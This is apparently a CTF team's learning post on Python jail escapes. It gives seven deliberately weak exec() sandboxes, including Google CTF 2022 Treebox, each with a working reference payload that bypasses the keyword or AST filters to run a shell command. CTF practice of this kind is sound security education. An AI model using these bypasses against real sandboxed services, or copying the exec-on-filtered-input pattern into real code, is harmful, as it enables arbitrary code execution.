---
layout: post
title: "Python Jail Escapes"
categories: learning
author: Liam
---

At our weekly meetings we had a talk about Python jail escapes, aka. getting around restrictions that make it hard to execute `os.system('cat flag.txt')`. In the talk we went through challenges, that we present here as exercises to practice. Starting very simple and then digging more and more into python internals.

Solve them yourself, by copying the script and providing input that executes `os.system('cat flag.txt')`. Afterwards you can compare your solution to the one we had in mind, there are always different ways. For some reference solutions it is relevant to mention, that we used Python 3.11.2.

Learning about Python Jail Escapes it is helpful to ask questions like:
* How are modules and classes implemented in Python?
* What are frozen modules?
* How does syntactic sugar get replaced? You may start at `import something` or `array[5]`.
* How many ways are there to call a function/method other than `lmao()`/`lm.oa()`?

## Happens way too often

```python
import string

code = input('Your scientific computation: ')

code = ''.join([c for c in code if c in string.printable])

forbidden = ['eval', 'exec', 'import', 'open', 'system', 'os', 'builtins']
for f in forbidden:
    code = code.replace(f, '')
exec(code)
```

<details>
<summary>Reference Solution</summary>

No need for recursivity. This is Python not Haskell.

<code>imosport ooss; ooss.sysostem('cat flag.txt')</code>
</details>

## Correct, or jail

```python
code = input('Your scientific computation: ')
code = ''.join([c for c in code if c in string.printable])
for keyword in ['eval', 'exec', 'import', 'open', 'system', 'os', 'builtins']:
    if keyword in code:
        print('You are jailed!')
        break
else:
    exec(code)
```

<details>
<summary>Reference Solution</summary>

There is a `for/else` in Python???!!? Ah, and obviously:

<code>globals()['__built'+ 'ins__'].__dict__['__im' + 'port__']('o' + 's').__dict__['sys' + 'tem']('cat flag.txt')</code>
</details>

## Only causing trouble

```python
import string

code = input('Your scientific computation: ')
code = ''.join([c for c in code if c in string.printable])
for keyword in ['eval', 'exec', 'import', 'open',
                'system', 'os', 'builtins', '+']:
    if keyword in code:
        print('You are jailed!', keyword)
        break
else:
    exec(code, {'__builtins__': {}})
```

<details>
<summary>Reference Solution</summary>

Based solution:

<code>().__class__.__base__.__subclasses__()[140].__init__.__globals__[''.join(['sy', 'stem'])]('cat flag.txt')</code>
</details>

## Ahhhhhhhhhh, no more fun for you

```python
import string

code = input('Your scientific computation: ')
code = ''.join([c for c in code if c in string.printable])
for keyword in ['eval', 'exec', 'import', 'open',
                'system', 'os', 'builtins', '+', '"', "'"]:
    if keyword in code:
        print('You are jailed!', keyword)
        break
else:
    exec(code, {'__builtins__': {}})
```

<details>
<summary>Reference Solution</summary>

Are there simpler solutions to construct a string? Yes. Does this one get you the flag? Also, yes. So why are you asking?

<code>().__class__.__base__.__subclasses__()[140].__init__.__globals__[().__str__()[:0].join([i.to_bytes().decode() for i in [115, 121, 115, 116, 101, 109]])](().__str__()[:0].join([i.to_bytes().decode() for i in [99, 97, 116, 32, 102, 108, 97, 103, 46, 116, 120, 116]]))</code>
</details>

## Now it is over, isn't it?

```python 
code = input('Your scientific computation: ')
code = ''.join([c for c in code if c in string.printable])
for keyword in ['eval', 'exec', 'import', 'open', 'system', 'os', 'builtins',
                '.', '[', ']']:
    if keyword in code:
        print('You are jailed!', keyword)
        break
else:
    exec(code)
```

<details>
<summary>Reference Solution</summary>

it is not over until you remove getattr

<code>getattr(getattr(getattr(globals(), 'get')('__bu' + 'iltins__'), '__imp' + 'ort__')('o' + 's'), 'sys' + 'tem')('cat flag?txt')</code>
</details>




## Treebox

From [Google Capture The Flag 2022](https://ctftime.org/event/1641/)

```python
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("-- Please enter code (last line must contain only --END)")
source_code = ""
while True:
  line = sys.stdin.readline()
  if line.startswith("--END"):
    break
  source_code += line

tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print("-- Executing safe code:")
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)
```

<details>
<summary>Reference Solution</summary>

Our solution, specifically the solution of Benedikt, looked something along the lines of:

<code>
class NotACall(Exception):
    __add__ = exec


try:
    raise NotACall
except NotACall as e:
    e + 'import os; os.system("cat flag.txt");exit(0)'
--END
</code>
</details>

## Treebox is no match for Robin

This a modified version of the treebox challenge, here to point out a particular way to solve the challenge.

```python
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("-- Please enter code (last line must contain only --END)")
source_code = ""
while True:
  line = sys.stdin.readline()
  if '(' in line or ')' in line:
        print("ERROR: Parentheses are not allowed")
        exit(1)
  if line.startswith("--END"):
    break
  source_code += line

tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print("-- Executing safe code:")
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)
else:
    print("ERROR: Code is not safe")
    exit(1)
```

<details>
<summary>Reference Solution</summary>

Also, no match for Robin, we yet have to find anything that is.

Solution by Robin Jadoul:
<code>
# https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
    pass
--END
</code>
</details>
